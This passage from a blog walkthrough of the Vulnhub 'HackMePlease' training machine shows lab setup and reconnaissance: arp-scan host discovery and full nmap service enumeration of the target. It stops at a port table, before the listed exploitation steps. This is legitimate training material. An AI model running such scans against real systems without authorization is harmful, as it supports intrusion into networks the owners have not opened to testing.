@@ -1,0 +1,1266 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+        <title>Vulnhub HackMePlease - V4ler1an</title><meta name="Description" content="Vulnhub Training -- HackMePlease"><meta property="og:title" content="Vulnhub HackMePlease" />
+<meta property="og:description" content="Vulnhub Training -- HackMePlease" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://www.v4ler1an.com/2023/11/vulnhub_empire_hackmeplease/" /><meta property="og:image" content="https://www.v4ler1an.com/2023/11/vulnhub_empire_hackmeplease/vulnhub.png" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-11-11T05:57:40+08:00" />
+<meta property="article:modified_time" content="2023-11-11T06:59:40+08:00" />
+
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:image" content="https://www.v4ler1an.com/2023/11/vulnhub_empire_hackmeplease/vulnhub.png" /><meta name="twitter:title" content="Vulnhub HackMePlease"/>
+<meta name="twitter:description" content="Vulnhub Training -- HackMePlease"/>
+<meta name="twitter:site" content="@YaoyaoShaw"/>
+<meta name="application-name" content="V4ler1an">
+<meta name="apple-mobile-web-app-title" content="V4ler1an"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://www.v4ler1an.com/2023/11/vulnhub_empire_hackmeplease/" /><link rel="prev" href="https://www.v4ler1an.com/2023/11/vulnhub_empire_lupinone/" /><link rel="next" href="https://www.v4ler1an.com/2023/11/vulnhub_empire_breakout/" /><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/normalize.css@8.0.1/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.13.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.7.2/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Vulnhub HackMePlease",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/www.v4ler1an.com\/2023\/11\/vulnhub_empire_hackmeplease\/"
+        },"image": [{
+                            "@type": "ImageObject",
+                            "url": "https:\/\/www.v4ler1an.com\/2023\/11\/vulnhub_empire_hackmeplease\/vulnhub.png",
+                            "width":  700 ,
+                            "height":  434 
+                        }],"genre": "posts","keywords": "Vulnhub","wordcount":  2227 ,
+        "url": "https:\/\/www.v4ler1an.com\/2023\/11\/vulnhub_empire_hackmeplease\/","datePublished": "2023-11-11T05:57:40+08:00","dateModified": "2023-11-11T06:59:40+08:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "xxxx","logo": "https:\/\/www.v4ler1an.com\/images\/avatar.png"},"author": {
+                "@type": "Person",
+                "name": "v4ler1an"
+            },"description": "Vulnhub Training -- HackMePlease"
+    }
+    </script></head>
+    <body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="V4ler1an"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="/images/personal_logo.png"
+        data-srcset="/images/personal_logo.png, /images/personal_logo.png 1.5x, /images/personal_logo.png 2x"
+        data-sizes="auto"
+        alt="/images/personal_logo.png"
+        title="/images/personal_logo.png" />V4ler1an</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> 所有文章 </a><a class="menu-item" href="/tags/"> 标签 </a><a class="menu-item" href="/categories/"> 分类 </a><a class="menu-item" href="/about/"> 我 </a><span class="menu-item delimiter"></span><a href="javascript:void(0);" class="menu-item language" title="选择语言">简体中文<i class="fas fa-chevron-right fa-fw"></i>
+                        <select class="language-select" id="language-select-desktop" onchange="location = this.value;"><option value="/2023/11/vulnhub_empire_hackmeplease/" selected>简体中文</option></select>
+                    </a><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                    <i class="fas fa-adjust fa-fw"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="V4ler1an"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="/images/personal_logo.png"
+        data-srcset="/images/personal_logo.png, /images/personal_logo.png 1.5x, /images/personal_logo.png 2x"
+        data-sizes="auto"
+        alt="/images/personal_logo.png"
+        title="/images/personal_logo.png" />V4ler1an</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        取消
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">所有文章</a><a class="menu-item" href="/tags/" title="">标签</a><a class="menu-item" href="/categories/" title="">分类</a><a class="menu-item" href="/about/" title="">我</a><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                <i class="fas fa-adjust fa-fw"></i>
+            </a><a href="javascript:void(0);" class="menu-item" title="选择语言">简体中文<i class="fas fa-chevron-right fa-fw"></i>
+                    <select class="language-select" onchange="location = this.value;"><option value="/2023/11/vulnhub_empire_hackmeplease/" selected>简体中文</option></select>
+                </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">目录</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animated flipInX">Vulnhub HackMePlease</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="https://www.v4ler1an.com" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw"></i>v4ler1an</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/web/"><i class="far fa-folder fa-fw"></i>Web</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2023-11-11">2023-11-11</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 2227 字&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 11 分钟&nbsp;<span id="/2023/11/vulnhub_empire_hackmeplease/" class="leancloud_visitors" data-flag-title="Vulnhub HackMePlease">
+                        <i class="far fa-eye fa-fw"></i>&nbsp;<span class=leancloud-visitors-count></span>&nbsp;次阅读
+                    </span>&nbsp;</div>
+        </div><div class="featured-image"><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/2023/11/vulnhub_empire_hackmeplease/vulnhub.png"
+        data-srcset="/2023/11/vulnhub_empire_hackmeplease/vulnhub.png, /2023/11/vulnhub_empire_hackmeplease/vulnhub.png 1.5x, /2023/11/vulnhub_empire_hackmeplease/vulnhub.png 2x"
+        data-sizes="auto"
+        alt="/2023/11/vulnhub_empire_hackmeplease/vulnhub.png"
+        title="Vulnhub Training -- HackMePlease" /></div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#knowledge">Knowledge</a></li>
+    <li><a href="#1-environment-setup">1. Environment Setup</a></li>
+    <li><a href="#2-reconnaisence">2. Reconnaisence</a>
+      <ul>
+        <li><a href="#1-ip-address">1. IP Address</a></li>
+        <li><a href="#2-port-info">2. Port Info</a></li>
+        <li><a href="#3-web-directory">3. Web Directory</a></li>
+      </ul>
+    </li>
+    <li><a href="#3-exploit">3. Exploit</a>
+      <ul>
+        <li><a href="#1-scan-the-web-path">1. Scan the web path</a></li>
+        <li><a href="#2-login-to-mysql">2. Login to mysql</a></li>
+        <li><a href="#3-exploit-the-website">3. Exploit the website</a></li>
+      </ul>
+    </li>
+    <li><a href="#4-privilege-escalation">4. Privilege Escalation</a></li>
+    <li><a href="#notes">Notes</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p>Vulnhub Training Walkthrough &ndash; HackMePlease</p>
+<h2 id="knowledge">Knowledge</h2>
+<ul>
+<li>js information</li>
+<li>conf file search</li>
+<li>mysql search</li>
+</ul>
+<h2 id="1-environment-setup">1. Environment Setup</h2>
+<p>Download the target <a href="https://download.vulnhub.com/hackmeplease/Hack_Me_Please.rar" target="_blank" rel="noopener noreffer">rar file</a>, unrar and import into VMware.</p>
+<h2 id="2-reconnaisence">2. Reconnaisence</h2>
+<h3 id="1-ip-address">1. IP Address</h3>
+<p>arp-scan get ip address:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>v4ler1an㉿kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ sudo arp-scan -l
+</span></span><span class="line"><span class="cl"><span class="o">[</span>sudo<span class="o">]</span> password <span class="k">for</span> v4ler1an:
+</span></span><span class="line"><span class="cl">Interface: eth0, type: EN10MB, MAC: 00:0c:29:9d:5b:9e, IPv4: 172.16.86.138
+</span></span><span class="line"><span class="cl">WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied
+</span></span><span class="line"><span class="cl">WARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied
+</span></span><span class="line"><span class="cl">Starting arp-scan 1.10.0 with <span class="m">256</span> hosts <span class="o">(</span>https://github.com/royhills/arp-scan<span class="o">)</span>
+</span></span><span class="line"><span class="cl">172.16.86.1	5e:52:30:c9:b7:65	<span class="o">(</span>Unknown: locally administered<span class="o">)</span>
+</span></span><span class="line"><span class="cl">172.16.86.2	00:50:56:fd:f8:ec	<span class="o">(</span>Unknown<span class="o">)</span>
+</span></span><span class="line"><span class="cl">172.16.86.150	00:0c:29:5c:d6:04	<span class="o">(</span>Unknown<span class="o">)</span>
+</span></span><span class="line"><span class="cl">172.16.86.254	00:50:56:f7:44:1e	<span class="o">(</span>Unknown<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="m">8</span> packets received by filter, <span class="m">0</span> packets dropped by kernel
+</span></span><span class="line"><span class="cl">Ending arp-scan 1.10.0: <span class="m">256</span> hosts scanned in 2.232 seconds <span class="o">(</span>114.70 hosts/sec<span class="o">)</span>. <span class="m">4</span> responded
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="2-port-info">2. Port Info</h3>
+<p>nmap get port and service information:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>v4ler1an㉿kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ nmap -p- -sV -sC  172.16.86.150 --open
+</span></span><span class="line"><span class="cl">Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2023-11-13 22:11 EST
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>v4ler1an㉿kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ nmap -T4 -p- -sV -sC  172.16.86.150 --open
+</span></span><span class="line"><span class="cl">Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2023-11-13 22:11 EST
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 172.16.86.150
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.0011s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">Not shown: <span class="m">65532</span> closed tcp ports <span class="o">(</span>conn-refused<span class="o">)</span>
+</span></span><span class="line"><span class="cl">PORT      STATE SERVICE VERSION
+</span></span><span class="line"><span class="cl">80/tcp    open  http    Apache httpd 2.4.41 <span class="o">((</span>Ubuntu<span class="o">))</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Welcome to the land of pwnland
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
+</span></span><span class="line"><span class="cl">3306/tcp  open  mysql   MySQL 8.0.25-0ubuntu0.20.04.1
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-date: TLS randomness does not represent <span class="nb">time</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>MySQL_Server_8.0.25_Auto_Generated_Server_Certificate
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2021-07-03T00:33:15
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_Not valid after:  2031-07-01T00:33:15
+</span></span><span class="line"><span class="cl"><span class="p">|</span> mysql-info:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   Protocol: <span class="m">10</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   Version: 8.0.25-0ubuntu0.20.04.1
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   Thread ID: <span class="m">44</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   Capabilities flags: <span class="m">65535</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   Some Capabilities: Support41Auth, Speaks41ProtocolOld, SupportsTransactions, DontAllowDatabaseTableColumn, IgnoreSpaceBeforeParenthesis, ConnectWithDatabase, SupportsLoadDataLocal, LongColumnFlag, InteractiveClient, SwitchToSSLAfterHandshake, SupportsCompression, Speaks41ProtocolNew, FoundRows, LongPassword, IgnoreSigpipes, ODBCClient, SupportsMultipleResults, SupportsMultipleStatments, SupportsAuthPlugins
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   Status: Autocommit
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   Salt: GoAEc<span class="se">\x</span>05_7@yr<span class="se">\x</span>0C:usjD6d+
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  Auth Plugin Name: caching_sha2_password
+</span></span><span class="line"><span class="cl">33060/tcp open  mysqlx?
+</span></span><span class="line"><span class="cl"><span class="p">|</span> fingerprint-strings:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Invalid message<span class="s2">&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s2">|     HY000
+</span></span></span><span class="line"><span class="cl"><span class="s2">|   LDAPBindReq:
+</span></span></span><span class="line"><span class="cl"><span class="s2">|     *Parse error unserializing protobuf message&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     HY000
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   oracle-tns:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Invalid message-frame.<span class="s2">&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s2">|_    HY000
+</span></span></span><span class="line"><span class="cl"><span class="s2">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF-Port33060-TCP:V=7.94SVN%I=7%D=11/13%Time=6552E561%P=x86_64-pc-linux-gnu
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:%r(NULL,9,&#34;</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">&#34;)%r(GenericLines,9,&#34;</span><span class="se">\x</span>05<span class="se">\0\0\0\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>SF:x0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">&#34;)%r(GetRequest,9,&#34;</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">&#34;)%r(HT
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:TPOptions,9,&#34;</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">&#34;)%r(RTSPRequest,9,&#34;</span><span class="se">\x</span>05<span class="se">\0\0\0</span>
+</span></span><span class="line"><span class="cl">SF:<span class="se">\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">&#34;)%r(RPCCheck,9,&#34;</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">&#34;)%r(DNS
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:VersionBindReqTCP,9,&#34;</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">&#34;)%r(DNSStatusRequestT
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:CP,2B,&#34;</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0\x</span>1e<span class="se">\0\0\0\x</span>01<span class="se">\x</span>08<span class="se">\x</span>01<span class="se">\x</span>10<span class="se">\x</span>88<span class="s1">&#39;\x1a\
+</span></span></span><span class="line"><span class="cl"><span class="s1">SF:x0fInvalid\x20message\&#34;\x05HY000&#34;)%r(Help,9,&#34;\x05\0\0\0\x0b\x08\x05\x1a
+</span></span></span><span class="line"><span class="cl"><span class="s1">SF:\0&#34;)%r(SSLSessionReq,2B,&#34;\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08
+</span></span></span><span class="line"><span class="cl"><span class="s1">SF:\x01\x10\x88&#39;</span><span class="se">\x</span>1a<span class="se">\x</span>0fInvalid<span class="se">\x</span>20message<span class="se">\&#34;\x</span>05HY000<span class="s2">&#34;)%r(TerminalServerCo
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:okie,9,&#34;</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">&#34;)%r(TLSSessionReq,2B,&#34;</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>
+</span></span><span class="line"><span class="cl">SF:0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0\x</span>1e<span class="se">\0\0\0\x</span>01<span class="se">\x</span>08<span class="se">\x</span>01<span class="se">\x</span>10<span class="se">\x</span>88<span class="s1">&#39;\x1a\x0fInvalid\x20messa
+</span></span></span><span class="line"><span class="cl"><span class="s1">SF:ge\&#34;\x05HY000&#34;)%r(Kerberos,9,&#34;\x05\0\0\0\x0b\x08\x05\x1a\0&#34;)%r(SMBProgN
+</span></span></span><span class="line"><span class="cl"><span class="s1">SF:eg,9,&#34;\x05\0\0\0\x0b\x08\x05\x1a\0&#34;)%r(X11Probe,2B,&#34;\x05\0\0\0\x0b\x08\
+</span></span></span><span class="line"><span class="cl"><span class="s1">SF:x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88&#39;</span><span class="se">\x</span>1a<span class="se">\x</span>0fInvalid<span class="se">\x</span>20message<span class="se">\&#34;\x</span><span class="m">0</span>
+</span></span><span class="line"><span class="cl">SF:5HY000<span class="s2">&#34;)%r(FourOhFourRequest,9,&#34;</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">&#34;)%r(LPDStr
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:ing,9,&#34;</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">&#34;)%r(LDAPSearchReq,2B,&#34;</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span><span class="m">0</span>
+</span></span><span class="line"><span class="cl">SF:b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0\x</span>1e<span class="se">\0\0\0\x</span>01<span class="se">\x</span>08<span class="se">\x</span>01<span class="se">\x</span>10<span class="se">\x</span>88<span class="s1">&#39;\x1a\x0fInvalid\x20messag
+</span></span></span><span class="line"><span class="cl"><span class="s1">SF:e\&#34;\x05HY000&#34;)%r(LDAPBindReq,46,&#34;\x05\0\0\0\x0b\x08\x05\x1a\x009\0\0\0\
+</span></span></span><span class="line"><span class="cl"><span class="s1">SF:x01\x08\x01\x10\x88&#39;</span><span class="se">\x</span>1a<span class="se">\*</span>Parse<span class="se">\x</span>20error<span class="se">\x</span>20unserializing<span class="se">\x</span>20protobuf<span class="se">\x</span>
+</span></span><span class="line"><span class="cl">SF:20message<span class="se">\&#34;\x</span>05HY000<span class="s2">&#34;)%r(SIPOptions,9,&#34;</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">&#34;)%r
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:(LANDesk-RC,9,&#34;</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">&#34;)%r(TerminalServer,9,&#34;</span><span class="se">\x</span>05<span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>SF:0<span class="se">\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">&#34;)%r(NCP,9,&#34;</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">&#34;)%r(Not
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:esRPC,2B,&#34;</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0\x</span>1e<span class="se">\0\0\0\x</span>01<span class="se">\x</span>08<span class="se">\x</span>01<span class="se">\x</span>10<span class="se">\x</span>88<span class="s1">&#39;\x
+</span></span></span><span class="line"><span class="cl"><span class="s1">SF:1a\x0fInvalid\x20message\&#34;\x05HY000&#34;)%r(JavaRMI,9,&#34;\x05\0\0\0\x0b\x08\x
+</span></span></span><span class="line"><span class="cl"><span class="s1">SF:05\x1a\0&#34;)%r(WMSRequest,9,&#34;\x05\0\0\0\x0b\x08\x05\x1a\0&#34;)%r(oracle-tns,
+</span></span></span><span class="line"><span class="cl"><span class="s1">SF:32,&#34;\x05\0\0\0\x0b\x08\x05\x1a\0%\0\0\0\x01\x08\x01\x10\x88&#39;</span><span class="se">\x</span>1a<span class="se">\x</span>16Inv
+</span></span><span class="line"><span class="cl">SF:alid<span class="se">\x</span>20message-frame<span class="se">\.\&#34;\x</span>05HY000<span class="s2">&#34;)%r(ms-sql-s,9,&#34;</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>
+</span></span><span class="line"><span class="cl">SF:05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">&#34;)%r(afp,2B,&#34;</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0\x</span>1e<span class="se">\0\0\0\x</span>01<span class="se">\x</span>08<span class="se">\x</span><span class="m">01</span>
+</span></span><span class="line"><span class="cl">SF:<span class="se">\x</span>10<span class="se">\x</span>88<span class="err">&#39;</span><span class="se">\x</span>1a<span class="se">\x</span>0fInvalid<span class="se">\x</span>20message<span class="se">\&#34;\x</span>05HY000<span class="s2">&#34;);
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span></span><span class="line"><span class="cl"><span class="s2">Nmap done: 1 IP address (1 host up) scanned in 19.48 seconds
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>Port and service info:</p>
+<table>
+<thead>
+<tr>
+<th>port</th>
+<th>service</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>80</td>
+<td>Apache httpd 2.4.41</td>
+</tr>
+<tr>
+<td>3306</td>
